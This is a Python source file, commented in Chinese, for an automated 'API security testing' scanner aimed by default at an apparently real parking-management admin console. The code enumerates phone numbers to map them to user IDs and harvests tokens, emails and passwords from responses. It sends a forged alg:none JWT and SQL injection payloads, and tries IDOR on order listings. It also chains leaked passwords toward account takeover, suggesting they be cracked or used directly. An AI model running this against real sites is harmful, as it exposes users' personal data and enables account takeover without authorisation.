"""
API 安全测试 Skill 执行器 v4.0 - 推理式

核心改进:
1. 响应推断引擎 - 从响应中学习敏感字段、ID、token
2. 认证上下文引擎 - 自动发现并传递认证信息
3. 参数推理引擎 - 推断并遍历测试参数
4. 漏洞链构造引擎 - 组合利用多个漏洞
"""

import sys
import re
import json
sys.path.insert(0, '/workspace/skill-play/API-Security-Testing-Optimized')

from core.prerequisite import prerequisite_check
from core.api_parser import APIEndpointParser
from core.cloud_storage_tester import CloudStorageTester


class ResponseInferenceEngine:
    """响应推断引擎 - 从响应中学习"""
    
    def __init__(self):
        self.findings = {
            'sensitive_fields': [],
            'user_ids': [],
            'tokens': [],
            'phones': [],
            'order_nos': [],
            'emails': [],
            'passwords': []
        }
        
    def analyze(self, url, method, response_text, response_json=None):
        """分析响应，提取敏感信息"""
        if not response_text:
            return
            
        # 提取敏感字段
        sensitive_patterns = ['password', 'token', 'secret', 'api_key', 'apikey', 'private']
        for field in sensitive_patterns:
            if field in response_text.lower():
                self.findings['sensitive_fields'].append({
                    'url': url,
                    'method': method,
                    'field': field
                })
                
        # 提取用户ID
        id_patterns = [
            r'"(?:userId|user_id|id)":\s*(\d+)',
            r'"id":\s*(\d+)',
        ]
        for pattern in id_patterns:
            matches = re.findall(pattern, response_text)
            for match in matches:
                uid = int(match)
                if uid not in self.findings['user_ids']:
                    self.findings['user_ids'].append(uid)
                    
        # 提取token
        token_patterns = [
            r'"(?:token|Token|TOKEN)":\s*"([^"]+)"',
            r'Bearer\s+([a-zA-Z0-9._-]+)',
        ]
        for pattern in token_patterns:
            matches = re.findall(pattern, response_text)
            for match in matches:
                if match not in self.findings['tokens']:
                    self.findings['tokens'].append(match)
                    
        # 提取手机号
        phone_pattern = r'"(?:phone|mobile|tel)":\s*"([^"]+)"'
        matches = re.findall(phone_pattern, response_text)
        for match in matches:
            if match not in self.findings['phones']:
                self.findings['phones'].append(match)
                
        # 提取订单号
        order_pattern = r'"(?:orderNo|order_no|serialNumber)":\s*"([^"]+)"'
        matches = re.findall(order_pattern, response_text)
        for match in matches:
            if match not in self.findings['order_nos']:
                self.findings['order_nos'].append(match)
                
        # 提取邮箱
        email_pattern = r'"(?:email|Email|EMAIL)":\s*"([^"]+)"'
        matches = re.findall(email_pattern, response_text)
        for match in matches:
            if match not in self.findings['emails']:
                self.findings['emails'].append(match)
                
        # 提取密码
        pwd_pattern = r'"password":\s*"([^"]+)"'
        matches = re.findall(pwd_pattern, response_text)
        for match in matches:
            if match and match not in ['null', 'undefined']:
                self.findings['passwords'].append(match)
                
    def get_context(self):
        """获取推理上下文"""
        return {
            'has_sensitive_data': len(self.findings['sensitive_fields']) > 0,
            'has_user_ids': len(self.findings['user_ids']) > 0,
            'has_tokens': len(self.findings['tokens']) > 0,
            'has_phones': len(self.findings['phones']) > 0,
            'has_order_nos': len(self.findings['order_nos']) > 0,
            'has_passwords': len(self.findings['passwords']) > 0,
        }
        
    def get_findings(self):
        return self.findings


class AuthContextEngine:
    """认证上下文引擎 - 自动发现并传递认证信息"""
    
    def __init__(self):
        self.auth_type = None
        self.token = None
        self.cookies = {}
        self.session = None
        
    def learn(self, url, method, response_headers, response_text):
        """从响应中学习认证机制"""
        # 检测 JWT
        if 'token' in response_text.lower():
            jwt_pattern = r'"token":\s*"([^"]+)"'
            match = re.search(jwt_pattern, response_text)
            if match:
                self.token = match.group(1)
                self.auth_type = 'Bearer'
                
        # 检测 session cookie
        set_cookie = response_headers.get('Set-Cookie', '')
        if set_cookie:
            for cookie in set_cookie.split(','):
                if 'JSESSIONID' in cookie or 'SESSION' in cookie:
                    self.auth_type = 'Session'
                    
    def apply(self, headers=None):
        """应用认证上下文到请求"""
        if headers is None:
            headers = {}
            
        if self.token and self.auth_type == 'Bearer':
            headers['Authorization'] = f'Bearer {self.token}'
            
        if self.cookies and self.auth_type == 'Session':
            cookie_str = '; '.join(f'{k}={v}' for k, v in self.cookies.items())
            headers['Cookie'] = cookie_str
            
        return headers
        
    def has_auth(self):
        return self.token is not None or bool(self.cookies)


class ParameterInferenceEngine:
    """参数推理引擎 - 推断并遍历测试参数"""
    
    def __init__(self):
        self.test_params = {
            'userId': [],
            'id': [],
            'orderNo': [],
            'phone': []
        }
        
    def add_user_ids(self, ids):
        """添加用户ID进行测试"""
        for uid in ids[:20]:  # 限制数量
            if uid not in self.test_params['userId']:
                self.test_params['userId'].append(uid)
                
    def add_phones(self, phones):
        """添加手机号进行测试"""
        for phone in phones[:20]:
            if phone not in self.test_params['phone']:
                self.test_params['phone'].append(phone)
                
    def generate_idor_tests(self):
        """生成IDOR测试用例"""
        tests = []
        for user_id in self.test_params['userId']:
            tests.append({
                'type': 'IDOR',
                'param': 'userId',
                'value': user_id,
                'description': f'测试userId={user_id}的越权访问'
            })
        return tests
        
    def generate_phone_tests(self):
        """生成手机号测试用例"""
        tests = []
        for phone in self.test_params['phone']:
            tests.append({
                'type': 'PhoneEnum',
                'param': 'phone',
                'value': phone,
                'description': f'测试手机号={phone}的用户查询'
            })
        return tests


class VulnerabilityChainEngine:
    """漏洞链构造引擎 - 组合利用多个漏洞"""
    
    def __init__(self):
        self.chains = []
        self.findings = []
        
    def add_finding(self, finding):
        """添加发现"""
        self.findings.append(finding)
        
    def analyze_chain(self):
        """分析可构造的漏洞链"""
        # 检查 MP-004 → 越权 链
        user_ids = [f for f in self.findings if f.get('type') == 'UserInfoLeak' and f.get('userId')]
        order_apis = [f for f in self.findings if f.get('type') == 'OrderAPI']
        
        if user_ids and order_apis:
            for uid_f in user_ids[:3]:
                self.chains.append({
                    'name': '用户信息泄露 → 越权订单',
                    'steps': [
                        f'获取用户 {uid_f.get("userId")} 的订单',
                        '查看是否存在敏感操作'
                    ],
                    'userId': uid_f.get('userId')
                })
                
        # 检查 密码泄露 → 账户 takeover
        passwords = [f for f in self.findings if f.get('type') == 'PasswordLeak']
        if passwords:
            for pwd_f in passwords[:3]:
                self.chains.append({
                    'name': '密码泄露 → 账户接管',
                    'steps': [
                        f'发现密码: {pwd_f.get("password")[:20]}...',
                        '可尝试哈希破解或直接使用'
                    ],
                    'password': pwd_f.get('password')
                })
                
        return self.chains


class SKILLExecutorV4:
    """API安全测试执行器 v4.0 - 推理式"""
    
    def __init__(self, target: str):
        self.target = target
        self.session = None
        self.playwright_available = False
        
        # 资产发现
        self.parser = None
        self.static_endpoints = []
        self.dynamic_endpoints = []
        self.api_prefix = None
        
        # 推理引擎
        self.response_engine = ResponseInferenceEngine()
        self.auth_engine = AuthContextEngine()
        self.param_engine = ParameterInferenceEngine()
        self.chain_engine = VulnerabilityChainEngine()
        
        # 结果
        self.vulnerabilities = []
        self.cloud_findings = []
        
    def run(self):
        """执行推理式测试"""
        print("=" * 70)
        print("  API Security Testing Skill v4.0 - 推理式")
        print("=" * 70)
        print(f"  目标: {self.target}")
        print()
        
        # 阶段0: 前置检查
        print("[阶段 0] 前置检查")
        self._check_prerequisites()
        
        # 阶段1: 资产发现
        print("\n[阶段 1] 资产发现 + 响应推断")
        self._asset_discovery()
        
        # 阶段2: 推理式漏洞测试
        print("\n[阶段 2] 推理式漏洞测试")
        self._inference_testing()
        
        # 阶段3: 漏洞链构造
        print("\n[阶段 3] 漏洞链构造")
        self._chain_analysis()
        
        # 阶段4: 报告
        print("\n[阶段 4] 报告")
        self._generate_report()
        
        return self._get_result()
    
    def _check_prerequisites(self):
        """前置检查"""
        self.playwright_available, _, can_proceed = prerequisite_check()
        if can_proceed:
            import requests
            self.session = requests.Session()
            self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
            print("  [OK] 前置检查通过")
    
    def _asset_discovery(self):
        """资产发现 + 响应推断"""
        self.parser = APIEndpointParser(self.target, self.session)
        
        # 静态分析
        self.static_endpoints = self.parser.parse_js_files(
            self.parser.discover_js_files()
        )
        print(f"  静态端点: {len(self.static_endpoints)}")
        
        # 推断API前缀
        self._infer_api_prefix()
        
        # 测试关键端点并推断
        self._probe_and_infer()
        
    def _infer_api_prefix(self):
        """推断API前缀"""
        from urllib.parse import urlparse
        target_path = urlparse(self.target).path.strip('/')
        if target_path:
            base = target_path.replace('-admin', '').replace('-api', '')
            if base and not base.startswith('_'):
                self.api_prefix = '/' + base
            else:
                self.api_prefix = '/' + target_path.split('/')[0]
        print(f"  API前缀: {self.api_prefix}")
        
    def _probe_and_infer(self):
        """探测端点并推断"""
        print("  [探测阶段]")
        
        # 1. 测试不需要认证的公开接口
        public_paths = [
            '/app/login/getUserInfoByPhone',
            '/app/login/getVerificationCode',
            '/sys/user/checkOnlyUser',
        ]
        
        print(f"    测试公开接口...")
        for path in public_paths:
            url = self._build_url(path)
            
            # 自动识别参数
            if 'getUserInfoByPhone' in path:
                # 探测手机号
                for prefix in ['138', '139', '188', '187']:
                    for i in range(5):
                        phone = f"{prefix}{i:07d}"[:11]
                        try:
                            r = self.session.get(f"{url}?phone={phone}", timeout=3)
                            self.response_engine.analyze(url, 'GET', r.text, None)
                            
                            if r.status_code == 200 and 'id' in r.text:
                                # 提取用户ID
                                match = re.search(r'"id":\s*(\d+)', r.text)
                                if match:
                                    user_id = int(match.group(1))
                                    if user_id not in self.response_engine.findings['user_ids']:
                                        self.response_engine.findings['user_ids'].append(user_id)
                                        self.response_engine.findings['phones'].append(phone)
                                        print(f"    [发现] {path}?phone={phone} -> userId={user_id}")
                        except:
                            pass
                            
            elif 'checkOnlyUser' in path:
                for phone in ['13800138000', '13900000001', '13812345678']:
                    try:
                        r = self.session.get(f"{url}?username={phone}", timeout=3)
                        self.response_engine.analyze(url, 'GET', r.text, None)
                    except:
                        pass
                        
        # 打印推断结果
        ctx = self.response_engine.get_context()
        print(f"\n  [推断结果]")
        print(f"    用户ID: {len(self.response_engine.findings['user_ids'])} 个")
        print(f"    手机号: {len(self.response_engine.findings['phones'])} 个")
        print(f"    Token: {len(self.response_engine.findings['tokens'])} 个")
        print(f"    密码: {len(self.response_engine.findings['passwords'])} 个")
        
    def _build_url(self, path):
        """构建完整URL"""
        from urllib.parse import urlparse
        # 提取host，使用正确的API路径
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        if not path.startswith('/'):
            path = '/' + path
        return base + self.api_prefix + path
        
    def _inference_testing(self):
        """推理式漏洞测试"""
        
        # 1. 敏感信息泄露测试
        self._test_sensitive_data_exposure()
        
        # 2. 认证绕过测试
        self._test_auth_bypass()
        
        # 3. 用户枚举测试
        self._test_user_enumeration()
        
        # 4. IDOR测试
        self._test_idor()
        
        # 5. SQL注入测试
        self._test_sql_injection()
        
    def _test_sensitive_data_exposure(self):
        """测试敏感信息泄露 - 推理式"""
        print("\n  [测试] 敏感信息泄露 (推理式)")
        
        # 从静态端点和发现中自动学习测试路径
        all_paths = set()
        
        # 从静态端点添加
        for ep in self.static_endpoints:
            path = ep.path
            # 匹配用户相关路径
            if any(k in path.lower() for k in ['user', 'login', 'info', 'profile']):
                all_paths.add(path)
                
        # 添加常见的敏感端点模式
        common_patterns = [
            '/app/login/getUserInfoByPhone',
            '/app/user/info',
            '/sys/user/getUserInfo',
            '/user/info',
            '/user/list',
        ]
        for p in common_patterns:
            all_paths.add(p)
            
        print(f"    自动学习到 {len(all_paths)} 个测试路径")
        
        for path in all_paths:
            url = self._build_url(path)
            try:
                r = self.session.get(url, timeout=5)
                
                # 分析响应
                self.response_engine.analyze(url, 'GET', r.text, 
                    r.json() if 'json' in r.headers.get('Content-Type','') else None)
                    
                # 检查是否有敏感字段
                if any(field in r.text.lower() for field in ['password', 'token', 'secret']):
                    print(f"    [发现] {path} - 包含敏感字段")
                    
                    # 如果包含密码，记录漏洞
                    if 'password' in r.text.lower():
                        self.vulnerabilities.append({
                            'type': 'Sensitive Data Exposure',
                            'severity': 'HIGH',
                            'endpoint': path,
                            'evidence': '返回敏感字段'
                        })
                        
            except:
                pass
                
        # 利用已发现的手机号进行探测
        for phone in self.response_engine.findings['phones']:
            url = self._build_url('/app/login/getUserInfoByPhone')
            try:
                r = self.session.get(f"{url}?phone={phone}", timeout=5)
                if 'password' in r.text.lower():
                    self.vulnerabilities.append({
                        'type': 'Sensitive Data Exposure',
                        'severity': 'HIGH',
                        'endpoint': '/app/login/getUserInfoByPhone',
                        'param': 'phone',
                        'value': phone,
                        'evidence': '返回password字段'
                    })
                    print(f"    [!] /app/login/getUserInfoByPhone?phone={phone} - 返回密码")
                    
                    # 提取更多信息到推理引擎
                    self.response_engine.analyze(url, 'GET', r.text, r.json() if 'json' in r.headers.get('Content-Type','') else None)
            except:
                pass
                        
    def _test_auth_bypass(self):
        """测试认证绕过"""
        print("\n  [测试] 认证绕过")
        
        # 测试空token
        test_paths = [
            '/app/parking/user/getUserInfo',
            '/sys/user/getUserInfo',
            '/user/info'
        ]
        
        for path in test_paths:
            url = self._build_url(path)
            try:
                # 无token
                r1 = self.session.get(url, timeout=5)
                
                # 尝试伪造token
                fake_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6IjEifQ."
                headers = {'X-Access-Token': fake_token}
                r2 = self.session.get(url, headers=headers, timeout=5)
                
                # 检查是否能用userId访问
                for uid in self.response_engine.findings['user_ids'][:3]:
                    r3 = self.session.get(f"{url}?userId={uid}", timeout=5)
                    if r3.status_code == 200 and str(uid) in r3.text:
                        self.vulnerabilities.append({
                            'type': 'IDOR',
                            'severity': 'HIGH',
                            'endpoint': path,
                            'param': 'userId',
                            'value': uid,
                            'evidence': '可越权访问其他用户信息'
                        })
                        print(f"    [!] {path}?userId={uid} - 越权访问")
                        
            except:
                pass
                
    def _test_user_enumeration(self):
        """测试用户枚举 - 推理式"""
        print("\n  [测试] 用户枚举 (推理式)")
        
        # 自动发现手机号格式并枚举
        discovered_phones = set()
        
        # 从已发现的手机号提取前缀
        for phone in self.response_engine.findings['phones']:
            # 识别手机号前缀模式
            if phone.startswith('13') or phone.startswith('15') or phone.startswith('17'):
                discovered_phones.add(phone)
                
        # 常见手机号前缀进行探测
        common_prefixes = ['138', '139', '188', '187', '186', '185', '156', '176', '177', '173']
        
        print(f"    已发现 {len(discovered_phones)} 个手机号")
        print(f"    开始探测用户枚举...")
        
        # 探测更多用户
        for prefix in common_prefixes[:5]:  # 限制数量
            for suffix in range(10):  # 只探测少量
                phone = f"{prefix}{suffix:07d}"[:11]
                if phone in discovered_phones:
                    continue
                    
                url = self._build_url('/app/login/getUserInfoByPhone')
                try:
                    r = self.session.get(f"{url}?phone={phone}", timeout=3)
                    if r.status_code == 200 and 'id' in r.text:
                        # 提取userId
                        match = re.search(r'"id":\s*(\d+)', r.text)
                        if match:
                            user_id = int(match.group(1))
                            discovered_phones.add(phone)
                            self.param_engine.add_user_ids([user_id])
                            self.chain_engine.add_finding({
                                'type': 'UserInfoLeak',
                                'phone': phone,
                                'userId': user_id
                            })
                            print(f"    [发现] 手机号 {phone} -> userId={user_id}")
                except:
                    pass
                
    def _test_idor(self):
        """测试IDOR"""
        print("\n  [测试] IDOR越权访问")
        
        # 添加已发现的用户ID
        for uid in self.response_engine.findings['user_ids']:
            self.param_engine.add_user_ids([uid])
            
        # 生成并执行IDOR测试
        idor_tests = self.param_engine.generate_idor_tests()
        
        # 测试订单接口
        order_paths = [
            '/app/order/list',
            '/order/list',
            '/parking/order/list'
        ]
        
        for test in idor_tests[:10]:
            for order_path in order_paths:
                url = self._build_url(order_path)
                try:
                    # 添加认证
                    headers = self.auth_engine.apply()
                    r = self.session.get(f"{url}?userId={test['value']}", headers=headers, timeout=5)
                    
                    if r.status_code == 200 and '"total"' in r.text:
                        # 检查是否有订单
                        match = re.search(r'"total":\s*(\d+)', r.text)
                        if match and int(match.group(1)) > 0:
                            self.vulnerabilities.append({
                                'type': 'IDOR - Order Access',
                                'severity': 'HIGH',
                                'endpoint': order_path,
                                'param': 'userId',
                                'value': test['value'],
                                'evidence': f'越权查看用户{test["value"]}的订单'
                            })
                            print(f"    [!] {order_path}?userId={test['value']} - 有订单，越权")
                            
                except:
                    pass
                    
    def _test_sql_injection(self):
        """测试SQL注入"""
        print("\n  [测试] SQL注入")
        
        # 添加认证上下文
        headers = self.auth_engine.apply()
        
        # 测试参数
        test_paths = [
            '/app/login/getUserInfoByPhone',
            '/sys/user/getUserInfo',
            '/user/info'
        ]
        
        sql_payloads = ["'", "' OR '1'='1", "1' AND '1'='2"]
        test_params = ['id', 'userId', 'page', 'phone']
        
        for path in test_paths:
            url = self._build_url(path)
            for param in test_params:
                for payload in sql_payloads:
                    try:
                        r = self.session.get(f"{url}?{param}={payload}", headers=headers, timeout=5)
                        
                        # 检测SQL错误
                        sql_errors = ['sql', 'syntax', 'error', 'mysql', 'oracle', 'sqlite']
                        if any(err in r.text.lower() for err in sql_errors):
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'severity': 'CRITICAL',
                                'endpoint': path,
                                'param': param,
                                'payload': payload,
                                'evidence': '响应包含SQL错误信息'
                            })
                            print(f"    [!] {path}?{param}={payload} - SQL注入")
                            break
                    except:
                        pass
                        
    def _chain_analysis(self):
        """漏洞链分析"""
        print("\n  [漏洞链分析]")
        
        # 利用已发现的信息构造漏洞链
        chains = self.chain_engine.analyze_chain()
        
        for chain in chains:
            print(f"\n  链: {chain['name']}")
            for step in chain['steps']:
                print(f"    -> {step}")
                
    def _generate_report(self):
        """生成报告"""
        print("\n" + "=" * 50)
        print("  测试完成 v4.0 (推理式)")
        print("=" * 50)
        
        # 按严重性分组
        critical = [v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']
        high = [v for v in self.vulnerabilities if v['severity'] == 'HIGH']
        medium = [v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']
        
        print(f"\n  漏洞统计:")
        print(f"    CRITICAL: {len(critical)}")
        print(f"    HIGH: {len(high)}")
        print(f"    MEDIUM: {len(medium)}")
        
        if self.vulnerabilities:
            print(f"\n  发现的问题:")
            for v in self.vulnerabilities[:10]:
                print(f"    [{v['severity']}] {v['type']}: {v.get('endpoint', 'N/A')}")
                
        # 打印推理上下文
        ctx = self.response_engine.get_context()
        if any(ctx.values()):
            print(f"\n  推理上下文:")
            if ctx.get('has_user_ids'):
                print(f"    已发现 {len(self.response_engine.findings['user_ids'])} 个用户ID")
            if ctx.get('has_phones'):
                print(f"    已发现 {len(self.response_engine.findings['phones'])} 个手机号")
            if ctx.get('has_tokens'):
                print(f"    已发现 {len(self.response_engine.findings['tokens'])} 个Token")
            if ctx.get('has_passwords'):
                print(f"    已发现 {len(self.response_engine.findings['passwords'])} 个密码哈希")
                
    def _get_result(self):
        """获取结果"""
        return {
            'target': self.target,
            'api_prefix': self.api_prefix,
            'vulnerabilities': self.vulnerabilities,
            'inference_context': self.response_engine.get_context(),
            'findings': self.response_engine.get_findings(),
            'chains': self.chain_engine.chains
        }


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "https://console.ncszkpark.com/ipark-admin/"
    
    executor = SKILLExecutorV4(target)
    result = executor.run()
    
    print("\n\n结果:")
    print(json.dumps(result, indent=2, ensure_ascii=False))
